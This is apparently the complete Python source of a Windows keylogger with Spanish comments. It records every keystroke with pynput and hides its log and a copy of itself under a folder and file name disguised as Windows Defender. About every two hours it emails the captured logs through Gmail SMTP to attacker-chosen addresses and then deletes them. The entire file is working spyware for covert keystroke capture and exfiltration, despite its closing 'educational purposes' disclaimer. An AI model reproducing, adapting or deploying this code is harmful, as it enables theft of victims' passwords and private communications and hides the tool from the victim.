#██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
#██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
#█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
#██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
#██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
#░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
#░██║░░██╗░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
#░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
#░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
#░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.0

# Librerías Utilizadas
from pynput.keyboard import Key, Listener
import pynput
from getpass import getuser # Obtiene el nombre del usuario
from datetime import datetime
import datetime
import os
import yagmail
import shutil
# Librería verifica internet 
import socket
import time
import threading # Hilos

# Obtiene registro de teclas y guarda en un archivo log.txt
def Klogger():
    CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
    )
    T = datetime.datetime.now()
    getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"

    with open (log, "a") as f:
        f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")

    def on_press(key):
        #print("-------")
        with open(log, "a") as f:
            if isinstance(key, pynput.keyboard.KeyCode): #convierte las teclas 0-9, a-z a codigo normal
                f.write('{}'.format(key.char))
            elif str(key) == "Key.space" :      # Espacio                                  
                f.write(' ')
            elif str(key) == "Key.backspace":   # Borrar
                f.write("[-]") 
            elif str(key) == "Key.enter":       # Salto de linea
                f.write('\n') 
            elif str(key) == "Key.tab":         # Tabulador
                f.write('   ')
            elif str(key) == "´" or str(key) == "Key.caps_lock" or str(key) == "´" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.cmd" or str(key) == "Key.alt_r" or str(key) == "Key.alt_l" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.right" or str(key) == "Key.down":
                pass 
            elif str(key) == "Key.print_screen" or str(key) == "Key.media_volume_up" or str(key) == "Key.media_volume_mute" or str(key) == "None" or str(key) == "Key.media_next" or str(key) == "Key.num_lock" or str(key) == "Key.media_volume_mute" or str(key) == "Key.media_previous" or str(key) == "Key.media_play_pause" :
                pass   
            else:
                f.write('{}'.format(key))

    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
        listener.join() 

# Envía los datos log.txt vía Gmail 
def sendEmail(log, sender_email, sender_password, receiver_email):
    try:
        mifecha                 = datetime.datetime.now()
        subject                 = "Data User: "+ str(getuser()) 
        # Inicia Sesión 
        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        # Cuerpo del mensaje
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("[+] Se envió el correo correctamente")
        return True;
    except:
        print("[-] No se pudo envíar el correo")
        return False

# Renombre el archivo log, antes de ser envíado
def Rename(name):
    try:
        CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
        # Copia el archivo 
        pathO = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
        pathN= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
        os.rename(pathO, pathN)
    except:
        pass

# Función = Verifica si hay conexión a internet para poder envíar el log
def VerificarConexion():
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
    try:                                                            # Intenta conectarse al servidor de Google
        con.connect(('www.google.com', 80))
        con.close()
        return True
    except:
        return False

# Crea el directorio oculto 
def CreateDir():
    try:  # Intenta crear la dirección
        os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
    except :
        pass

# Cópia él Keylogger a la carpeta oculta 
def EscondeKey():
    CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
    nameKey = "WindowsDefender.exe"
    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey

    try:
        with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
            print("El keylogger ya se encuentra en la carpeta oculta")
    except :
        print("El Keylogger no se encuentra en el sistema, y tratará de copiarlo")
        try:
            shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
            print("El keylogger se escondió exitosamente en el sistema")
        except:
            print("No se puedo esconder el Keylogger en el sistema")

# Intervalo de tiempo que se enviará el archivo log.txt
def SendLog():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1

        # Correo de envío [Principal]      <=> Se enviará 
        sender_email_P       = "Send123@gmail.com"   # <<== Cambia éste correo
        sender_password_P    = "contraseña1"          # <<== Contraseña del correo 

        # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
        sender_email_S       = "Sendabc@gmail.com"   # <<== Cambia éste correo
        sender_password_S    = "contraseña2"          # <<== Contraseña del correo 

        # Correo o correos que recibirán el registro de datos `log.txt`
        receiver_email   = ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"] # MultiCorreo
      # receiver_email   = ["correo@gmail.com"]  # SingleCorreo

        # Enviar cada 2 horas aprox
        for x in range(720):    #720
            time.sleep(10) # *10 
            #print("Pasó: "+ str(x*10))

        if VerificarConexion(): # Continua solo si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`

            #Envía el archivo renombrado
            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Envía con el primer correo
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):  # Envía con el segundo correo 
                os.remove(homedir)
        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass

# Inicio multihilo
if __name__ == '__main__':
    
    EscondeKey()
    p1 = threading.Thread(target=Klogger)
    p2 = threading.Thread(target=SendLog)
    p2.start()
    p1.start()
    p1.join()

#################################################################
#                                                               #
#                 Developed by SebastianEPH                     #
#                                                   v.2.1       #
#################################################################
# Notas importantes
#
# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
#
# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python

